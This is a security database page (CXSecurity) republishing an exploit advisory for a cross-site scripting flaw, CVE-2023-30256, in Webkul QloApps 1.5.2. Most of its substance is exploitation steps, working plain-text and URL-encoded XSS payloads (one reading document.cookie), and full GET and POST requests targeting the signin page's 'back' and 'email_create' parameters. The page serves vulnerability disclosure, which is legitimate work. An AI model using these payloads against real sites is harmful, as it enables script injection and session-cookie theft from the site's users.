---
title: Webkul Qloapps 1.5.2 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023050078
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-29
fetch_date: 2025-10-04T11:37:05.665843
---

# Webkul Qloapps 1.5.2 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Webkul Qloapps 1.5.2 Cross Site Scripting** **2023.05.28**  Credit:  **[Astik Rawat](https://cxsecurity.com/author/Astik%2BRawat/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-30256](https://cxsecurity.com/cveshow/CVE-2023-30256/ "Click to see CVE-2023-30256")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Webkul Qloapps 1.5.2 - Cross-Site Scripting (XSS)
# Date: 15 May 2023
# Exploit Author: Astik Rawat (ahrixia)
# Vendor Homepage: https://qloapps.com/
# Software Link: https://github.com/webkul/hotelcommerce
# Version: 1.5.2
# Tested on: Kali Linux 2022.4
# CVE : CVE-2023-30256
Description:
A Cross Site Scripting (XSS) vulnerability exists in Webkul Qloapps which is a free and open-source hotel reservation & online booking system written in PHP and distributed under OSL-3.0 Licence.
Steps to exploit:
1) Go to Signin page on the system.
2) There are two parameters which can be exploited via XSS
- back
- email\_create
2.1) Insert your payload in the "back"- GET and POST Request
Proof of concept (Poc):
The following payload will allow you to execute XSS -
Payload (Plain text):
xss onfocus=alert(1) autofocus= xss
Payload (URL Encoded):
xss%20onfocus%3dalert(1)%20autofocus%3d%20xss
Full GET Request (back):
[http://localhost/hotelcommerce-1.5.2/?rand=1679996611398&controller=authentication&SubmitCreate=1&ajax=true&email\_create=a&back=xss%20onfocus%3dalert(1)%20autofocus%3d%20xss&token=6c62b773f1b284ac4743871b300a0c4d]
2.2) Insert your payload in the "email\_create" - POST Request Only
Proof of concept (Poc):
The following payload will allow you to execute XSS -
Payload (Plain text):
xss><img src=a onerror=alert(document.cookie)>xss
Payload (URL Encoded):
xss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss
POST Request (email\_create) (POST REQUEST DATA ONLY):
[controller=authentication&SubmitCreate=1&ajax=true&email\_create=xss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss&back=my-account&token=6c62b773f1b284ac4743871b300a0c4d]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050078)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top